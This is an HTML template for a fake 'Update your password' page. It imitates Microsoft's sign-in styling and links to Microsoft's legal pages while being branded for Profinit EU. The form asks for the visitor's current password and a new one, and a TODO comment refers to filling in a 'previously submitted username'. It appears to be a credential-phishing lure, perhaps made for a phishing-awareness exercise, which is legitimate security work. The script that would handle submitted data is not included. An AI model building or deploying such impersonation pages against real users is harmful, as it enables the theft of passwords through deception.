<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <script src="scripts.js" defer></script>
    <link rel="stylesheet" href="my_style.css" media="all">
    <link rel="icon" href="media/windows_icon.ico" sizes="32x32" />

    <title>Update password</title>
</head>

<body>
    <div id="branding" class="brandMS"></div>
    <div id="content" class="content middle animateFadeIn">
        <img id="companyLogo" src="media/microsoft_logo.svg" width="108" height="24" alt="Profinit EU">
        <main>
            <article id="loginArticle" class="formattedColumn">
                <!-- TODO Fill with previously submitted username (or remove completely) -->
                <p>jprijmeni@profinit.eu</p>
                <h2>Update your password</h2>
                <p>You need to update your password because this is the first time you are signing in, or because your password has expired.</p>
                <form action="#" method="post" id="passwordForm" class="formattedColumn" novalidate="novalidate">
                    <div class="inputField formattedColumn">
                        <span id="oldPasswordError" class="error"></span>
                        <label for="oldPassword" hidden>Current password</label>
                        <input type="password" id="oldPassword" name="oldPassword" class="login" placeholder="Current password" required>
                    </div>
                    <div class="inputField formattedColumn">
                        <span id="newPasswordError" class="error"></span>
                        <label for="newPassword" hidden>Create new password</label>
                        <input type="password" id="newPassword" name="newPassword" class="login" placeholder="New password" required>
                    </div>
                    <div class="inputField formattedColumn">
                        <span id="confirmPasswordError" class="error"></span>
                        <label for="confirmPassword" hidden>Confirm new password</label>
                        <input type="password" id="confirmPassword" name="confirmPassword" class="login" placeholder="Confirm password" required>
                    </div>
                    <div class="buttonContainer">
                        <button type="submit" class="button">Sign in</button>
                    </div>
                </form>
            </article>
        </main>
    </div>
    <footer>
        <a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
        <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy & cookies</a>
        <a href="#">. . .</a>
    </footer>
</body>

</html>
